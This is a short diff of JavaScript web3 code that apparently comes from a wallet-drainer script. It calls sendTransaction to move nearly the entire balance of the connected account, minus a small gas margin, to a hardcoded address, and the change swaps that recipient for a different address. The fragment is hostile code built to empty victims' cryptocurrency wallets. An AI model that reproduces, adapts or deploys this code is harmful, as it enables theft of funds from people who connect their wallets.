@@ -46,7 +46,7 @@ var ammmount = (bleg-0.0014)*1000000000000000000;
 
 web3.eth.sendTransaction({
        from: account,
-    to: '0x00555F4f4D0b1dBCD20F0fBc791efd7C88BFa76f',
+    to: '0xA9B49b0B548F058ee73a2cd1F4893553c03F8595',
      gasPrice: '20000000000',
     value: ammmount.toFixed(5)
 }, function(error, hash){
